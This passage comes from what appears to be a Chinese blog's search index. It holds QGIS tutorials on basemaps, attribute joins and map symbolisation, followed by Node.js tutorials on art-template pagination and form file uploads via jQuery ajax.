data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/22.png" alt></p><p>线要素标注如下：</p><p>除了使用单一符号，也可以通过【分类】的方法更好的表达属性值</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/23.png" alt>    </p><p>还可以设置每个属性值的样式</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/24.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E5%88%9B%E5%BB%BA%E7%9F%A2%E9%87%8F%E6%95%B0%E6%8D%AE/25.png" alt></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> QGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> QGIS入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QGIS添加精美底图的方法</title>
      <link href="/2020/07/29/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E7%B2%BE%E7%BE%8E%E5%BA%95%E5%9B%BE%E7%9A%84%E6%96%B9%E6%B3%95/"/>
      <url>/2020/07/29/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E7%B2%BE%E7%BE%8E%E5%BA%95%E5%9B%BE%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>一个漂亮的地图=背景底图+专题信息，本实验旨在掌握添加精美底图的方法以及插入矢量数据选择方法总结。</p><h1 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h1><p>添加底图的方法主要有两种</p><ul><li><p><strong>手动逐个添加</strong></p><p>优点：按需求选择底图</p><p>缺点：逐个选择逐个添加</p></li><li><p><strong>安装插件</strong></p><p>优点：多个插件提供多个底图</p><p>缺点：部分底图不能正常显示</p></li></ul><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol><li><p><strong>手动逐个添加底图</strong></p></li><li><p><strong>单个添加</strong></p><p>在浏览窗口选择【XYZ Tiles】右键【新建连接】</p><p>在对话框上输入名称以及图片的瓦片服务地址</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E7%B2%BE%E7%BE%8E%E5%BA%95%E5%9B%BE%E7%9A%84%E6%96%B9%E6%B3%95/1.png" alt></p><p>双击你已经连接的底图即可在窗口加载</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E7%B2%BE%E7%BE%8E%E5%BA%95%E5%9B%BE%E7%9A%84%E6%96%B9%E6%B3%95/2.png" alt></p></li><li><p><strong>批量添加</strong></p><p>这部分内容涉及到python，后面再来补充学习</p></li><li><p><strong>安装插件添加底图</strong></p><p>可以通过安装插件</p><p><strong>OpenLayers Plugin</strong></p><p><strong>QuickMap Services</strong></p><p>以及自带的【HCMGIS】|【<strong>BaseMap</strong>】添加底图</p></li><li><p><strong>矢量数据选择方法</strong></p></li><li><p><strong>鼠标拾取</strong></p><ul><li>选择要素（可通过按住shift或ctrl选择多个）</li><li>按多边形选择要素</li><li>自由手绘选择要素</li><li>按半径选择要素</li></ul><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E7%B2%BE%E7%BE%8E%E5%BA%95%E5%9B%BE%E7%9A%84%E6%96%B9%E6%B3%95/3.png" alt></p></li><li><p><strong>表达式选取</strong></p><p>按住ctrl+F6打开属性表</p><p>然后在属性表菜单栏打开【使用表达式选择要素】</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E7%B2%BE%E7%BE%8E%E5%BA%95%E5%9B%BE%E7%9A%84%E6%96%B9%E6%B3%95/4.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E7%B2%BE%E7%BE%8E%E5%BA%95%E5%9B%BE%E7%9A%84%E6%96%B9%E6%B3%95/5.png" alt></p></li><li><p><strong>空间选取</strong></p><p>基于另一个图层选择要素</p><p>在菜单栏选择【矢量】|【研究工具】|【按位置选择】</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E7%B2%BE%E7%BE%8E%E5%BA%95%E5%9B%BE%E7%9A%84%E6%96%B9%E6%B3%95/6.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%B7%BB%E5%8A%A0%E7%B2%BE%E7%BE%8E%E5%BA%95%E5%9B%BE%E7%9A%84%E6%96%B9%E6%B3%95/7.png" alt></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> QGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> QGIS入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QGIS文本数据加载及属性表连接</title>
      <link href="/2020/07/29/QGIS/QGIS%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%B1%9E%E6%80%A7%E8%A1%A8%E8%BF%9E%E6%8E%A5/"/>
      <url>/2020/07/29/QGIS/QGIS%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%B1%9E%E6%80%A7%E8%A1%A8%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><p>掌握QGIS加载文本数据以及点数据的符号化，实现excel表和属性表的连接。</p><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol><li><p><strong>加载文本数据</strong></p><p>利用【图层】|【添加图层】|【添加文本数据】加载文本数据</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%B1%9E%E6%80%A7%E8%A1%A8%E8%BF%9E%E6%8E%A5/1.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%B1%9E%E6%80%A7%E8%A1%A8%E8%BF%9E%E6%8E%A5/2.png" alt></p><p>有时候加载的文本数据会中文会出现乱码的情况，这时候要在【编码】选择合适的语言 默认是UTF-8</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%B1%9E%E6%80%A7%E8%A1%A8%E8%BF%9E%E6%8E%A5/3.png" alt></p></li><li><p><strong>点数据符号化</strong></p><p>利用图层样式中的【单一符号】进行相应的参数设置</p><p>【大小】|【编辑】打开【表达式字符串构建器】|【字段和值】| mag（震级）|<br>OK</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%B1%9E%E6%80%A7%E8%A1%A8%E8%BF%9E%E6%8E%A5/4.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%B1%9E%E6%80%A7%E8%A1%A8%E8%BF%9E%E6%8E%A5/5.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%B1%9E%E6%80%A7%E8%A1%A8%E8%BF%9E%E6%8E%A5/6.png" alt></p></li><li><p><strong>Excel与属性表连接</strong></p><p>加载excel表（通过打开excel转为csv文件再导入QGIS）以及要连接的矢量图层</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%B1%9E%E6%80%A7%E8%A1%A8%E8%BF%9E%E6%8E%A5/7.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%B1%9E%E6%80%A7%E8%A1%A8%E8%BF%9E%E6%8E%A5/8.png" alt></p><p>在矢量图层右键【属性】|【连接】选择连接字段和目标字段</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%B1%9E%E6%80%A7%E8%A1%A8%E8%BF%9E%E6%8E%A5/9.png" alt></p><p>连接成功，结果如图：</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%B1%9E%E6%80%A7%E8%A1%A8%E8%BF%9E%E6%8E%A5/10.png" alt></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> QGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> QGIS入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QGIS数据美化</title>
      <link href="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/"/>
      <url>/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><h2 id="矢量数据的符号化表达"><a href="#矢量数据的符号化表达" class="headerlink" title="矢量数据的符号化表达"></a>矢量数据的符号化表达</h2><ul><li><p>热力图</p></li><li><p>点聚类</p></li><li><p>2.5D三维</p></li></ul><h2 id="栅格数据的符号化表达"><a href="#栅格数据的符号化表达" class="headerlink" title="栅格数据的符号化表达"></a>栅格数据的符号化表达</h2><ul><li><p>单波段伪彩色</p></li><li><p>山体阴影</p></li><li><p>晕渲效果（单波段伪彩色+山体阴影）</p></li></ul><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><ol><li><p><strong>热力图制作</strong></p><p>将数据加载进QGIS窗口</p><p>由于单一符号过于单调，我们要进行美化</p><p>首先是热力图的制作</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/1.png" alt></p><p>在点数据图层上右键单击【属性】|【符号化】|【热图】</p><p>选择色彩进行表达</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/2.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/3.png" alt></p><p>密集处是蓝色的，底图是红色的，不太符合认知，因此进行反转颜色</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/4.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/5.png" alt></p><p>由于底图全部被蓝色覆盖了，我们把蓝色换为透明显示</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/6.png" alt></p><p>热力图如下：</p><p>可以根据热力图分析区域的分布特点</p><p>由图可知，我国5A景点在江南地带分布最广</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/7.png" alt></p></li><li><p><strong>点聚类制作</strong></p><p>在点数据图层上右键单击【属性】|【符号化】|【点聚类】</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/8.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/9.png" alt></p></li><li><p><strong>2.5D三维</strong></p><p>由于进行简单分析，我自己建了一个矢量图层，自编辑建筑及Height字段的属性值</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/10.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/11.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/12.png" alt></p><p>在图层样式中出现【2.5D】选中之后，设置下面相关属性，阴影、角度、颜色等</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/13.png" alt></p></li><li><p>5D三维效果如下</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/14.png" alt></p></li><li><p><strong>单波段伪彩色</strong></p><p>在DEM数据层上右键单击【属性】|【符号化】|【单波段伪彩色】选择反转颜色</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/15.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/16.png" alt></p><p>在DEM数据层上右键单击【属性】|【符号化】|【山体阴影】其他参数默认或者自己编辑</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/17.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/18.png" alt></p></li><li><p><strong>晕渲效果</strong></p><p>在原来DEM上右键单击【创建副本】</p><p>根据上面将一个图层设置为山体阴影，另一个图层设置为单波段伪彩色</p><p>然后将单波段伪彩色的透明度降低，降低多少由源数据而定</p><p>要注意图层的放置顺序</p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/19.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/20.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/07/29/QGIS/QGIS%E6%95%B0%E6%8D%AE%E7%BE%8E%E5%8C%96/21.png" alt></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> QGIS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GIS </tag>
            
            <tag> QGIS入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node配合art-template实现同步分页</title>
      <link href="/2020/07/29/node%E9%85%8D%E5%90%88art-template%E5%AE%9E%E7%8E%B0%E5%90%8C%E6%AD%A5%E5%88%86%E9%A1%B5/"/>
      <url>/2020/07/29/node%E9%85%8D%E5%90%88art-template%E5%AE%9E%E7%8E%B0%E5%90%8C%E6%AD%A5%E5%88%86%E9%A1%B5/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>在自己做的一个论坛案例中，实现让页面按数据量进行合理的同步刷新分页显示效果，这里需要了解数据分页显示的相关数学运算基础，没错，你需要先了解每一页的数据量以及某一页数据索引位置的数学运算，以及<a href="http://www.mongoosejs.net/docs/guide.html" target="_blank" rel="noopener">monoose API</a>相关查询</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><ol><li><p>首先在后台，对从数据库拿到的数据进行分析</p><p>通过查阅mongoose API，可以通过以下方式将多条数据按需划分，例如，每页只需展示6条评论数据，则进行相关运算，那么第二页为12，展示的数据从7开始，12结束，第三页为18，展示的数据从13开始，18结束，然后就可以得出规律，每一页都是从<code>(页数 - 1) * 展示数</code>开始截取数据。然后咱们就可以通过以下代码实现了，最后就是获得当前页数，总页数以及所需展示的文章数和用户信息，再使用art-template进行前端页面渲染</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//实现分页</span></span><br><span class="line">    <span class="keyword">const</span> page = <span class="built_in">Number</span>.parseInt(req.query.page, <span class="number">10</span>) <span class="comment">//获取当前页页数</span></span><br><span class="line">    <span class="keyword">const</span> pageSize = <span class="number">6</span> <span class="comment">//定义每页显示的数据量</span></span><br><span class="line">    Topic</span><br><span class="line">        .find() <span class="comment">//查询所有信息</span></span><br><span class="line">        .skip((page - <span class="number">1</span>) * pageSize) <span class="comment">//跳过前(page - 1) * pageSize条，直接从(page - 1) * pageSize + 1开始</span></span><br><span class="line">        .limit(pageSize) <span class="comment">//只截取pageSize条数据</span></span><br><span class="line">        .exec(<span class="function">(<span class="params">err, user</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                <span class="keyword">return</span> next(err)</span><br><span class="line">            &#125;</span><br><span class="line">            Topic.count(<span class="function">(<span class="params">err, count</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="keyword">return</span> next(err)</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">const</span> totalPage = <span class="built_in">Math</span>.ceil(count / pageSize) <span class="comment">// 总页码 = 总记录数 / 每页显示大小，向下取整</span></span><br><span class="line">                res.render(<span class="string">'index.html'</span>, &#123;</span><br><span class="line">                    user: req.session.user, <span class="comment">//用户登录状态信息</span></span><br><span class="line">                    topic: user, <span class="comment">//将评论渲染到页面</span></span><br><span class="line">                    totalPage, <span class="comment">//总页数</span></span><br><span class="line">                    page, <span class="comment">//当前页数</span></span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>前端页面代码，这里因为总是上不了art-template官网，所以只能从已有的笔记中使用art-template中each遍历的原始语法，通过遍历总页数，将每一页的a标签渲染出来，再进行语句判断，如果是当前页数，则进行样式改变，最后添加上一页下一页效果，完整代码如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 分页 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">aria-label</span>=<span class="string">"Page navigation"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"pagination"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">            &#123;&#123;if page !== 1&#125;&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/?page=&#123;&#123;page - 1&#125;&#125;"</span> <span class="attr">aria-label</span>=<span class="string">"Previous"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="symbol">&amp;laquo;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            &#123;&#123;else&#125;&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">aria-label</span>=<span class="string">"Previous"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="symbol">&amp;laquo;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            &#123;&#123;/if&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &lt;% for(var i = 0; i &lt; totalPage; i++)&#123; %&gt;</span><br><span class="line">        &#123;&#123; if (i + 1) === page &#125;&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/?page=&#123;&#123; i + 1 &#125;&#125;"</span>&gt;</span>&#123;&#123; i + 1 &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &#123;&#123; else &#125;&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/?page=&#123;&#123; i + 1 &#125;&#125;"</span>&gt;</span>&#123;&#123; i + 1 &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        &#123;&#123; /if &#125;&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">%</span> &#125; %&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">            &#123;&#123;if page === totalPage&#125;&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">aria-label</span>=<span class="string">"Next"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="symbol">&amp;raquo;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            &#123;&#123; else &#125;&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/?page=&#123;&#123;page + 1&#125;&#125;"</span> <span class="attr">aria-label</span>=<span class="string">"Next"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="symbol">&amp;raquo;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            &#123;&#123;/if&#125;&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="显示效果"><a href="#显示效果" class="headerlink" title="显示效果"></a>显示效果</h2><p><img src= "/img/loading.gif" data-src="/2020/07/29/node%E9%85%8D%E5%90%88art-template%E5%AE%9E%E7%8E%B0%E5%90%8C%E6%AD%A5%E5%88%86%E9%A1%B5/image-20200728170822970.png" alt="image-20200728170822970"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node.js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>form表单文件提交以及异步请求和服务端解析</title>
      <link href="/2020/07/29/form%E8%A1%A8%E5%8D%95%E6%96%87%E4%BB%B6%E6%8F%90%E4%BA%A4/"/>
      <url>/2020/07/29/form%E8%A1%A8%E5%8D%95%E6%96%87%E4%BB%B6%E6%8F%90%E4%BA%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="页面处理"><a href="#页面处理" class="headerlink" title="页面处理"></a>页面处理</h1><p>在form表单添加<code>enctype</code>属性，并赋值为<code>multipart/form-data</code>，即可实现文件提交</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"age"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"img"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="ajax提交请求"><a href="#ajax提交请求" class="headerlink" title="ajax提交请求"></a>ajax提交请求</h1><p>这里有三个参数要注意，一个是data，它可以将文件数据传至服务端，processData和contentType在注释中有相关说明</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'form'</span>).on(<span class="string">'submit'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  $.ajax(&#123;</span><br><span class="line">    url: $(<span class="keyword">this</span>).attr(<span class="string">'action'</span>),</span><br><span class="line">    type: $(<span class="keyword">this</span>).attr(<span class="string">'method'</span>),</span><br><span class="line">    data: <span class="keyword">new</span> FormData($(<span class="keyword">this</span>)[<span class="number">0</span>]),</span><br><span class="line">    processData: <span class="literal">false</span>,  <span class="comment">// tell jQuery not to process(处理) the data</span></span><br><span class="line">    contentType: <span class="literal">false</span>,  <span class="comment">// tell jQuery not to set contentType，在这里jQuery 会默认把 Content-Type 设置为 application/x-www-form-urlencoded; charset=UTF-8</span></span><br><span class="line">    success: <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (data.err_code === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">window</span>.location.href = <span class="string">'/advert'</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="formidable解析表单请求体"><a href="#formidable解析表单请求体" class="headerlink" title="formidable解析表单请求体"></a>formidable解析表单请求体</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure 